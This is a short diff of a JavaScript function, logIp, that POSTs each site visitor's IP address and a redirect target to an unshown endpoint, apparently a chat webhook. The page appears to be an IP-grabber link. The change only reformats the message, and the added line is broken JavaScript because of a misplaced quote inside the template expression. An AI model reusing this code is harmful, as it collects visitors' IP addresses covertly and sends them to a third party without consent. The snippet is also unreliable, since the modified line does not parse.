@@ -82,7 +82,7 @@ function logIp() {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `📡 Visitor accessed your site!\nIP: ${data.ip}\nGotoAfter: ${gotoAfter}`
+                    content: `Visitor accessed your site!\nIP: "${data.ip"}\nGotoAfter: "${gotoAfter}"`
                 })
             });
         })
